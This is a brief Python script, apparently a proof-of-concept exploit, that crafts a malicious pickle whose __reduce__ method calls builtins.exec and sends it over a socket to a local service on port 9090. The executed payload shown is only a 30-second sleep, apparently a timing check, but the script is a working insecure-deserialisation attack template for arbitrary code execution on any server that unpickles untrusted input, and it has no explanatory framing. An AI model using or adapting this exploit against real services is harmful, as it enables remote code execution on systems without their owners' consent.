#!/usr/bin/env python3

import socket, pickle, builtins

HOST = "127.0.0.1"
PORT = 9090

class Pickle(object):
    def __reduce__(self):
        import os
        return (builtins.exec, ("import time; time.sleep(30)",))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((HOST,PORT))
    sock.sendall(pickle.dumps(Pickle()))
    